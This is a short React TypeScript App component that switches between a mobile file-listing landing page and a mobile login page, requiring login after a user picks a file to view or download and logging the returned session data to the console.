import React, { useState } from 'react';
import { useScreenSize } from './hooks/useScreenSize';
import MobileLandingPage from './components/mobile/MobileLandingPage';
import MobileLoginPage from './components/mobile/MobileLoginPage';

function App() {
  const [currentView, setCurrentView] = useState<'landing' | 'login'>('landing');
  const [selectedFile, setSelectedFile] = useState<string>('');
  const screenSize = useScreenSize();

  const handleFileAction = (fileName: string, action: 'view' | 'download') => {
    setSelectedFile(fileName);
    setCurrentView('login');
  };

  const handleBackToLanding = () => {
    setCurrentView('landing');
  };

  const handleLoginSuccess = (sessionData: any) => {
    console.log('Login successful, session data:', sessionData);
  };

  return (
    <div className="min-h-screen">
      {currentView === 'landing' ? (
        <MobileLandingPage onFileAction={handleFileAction} />
      ) : (
        <MobileLoginPage 
          fileName={selectedFile} 
          onBack={handleBackToLanding}
          onLoginSuccess={handleLoginSuccess}
        />
      )}
    </div>
  );
}

export default App;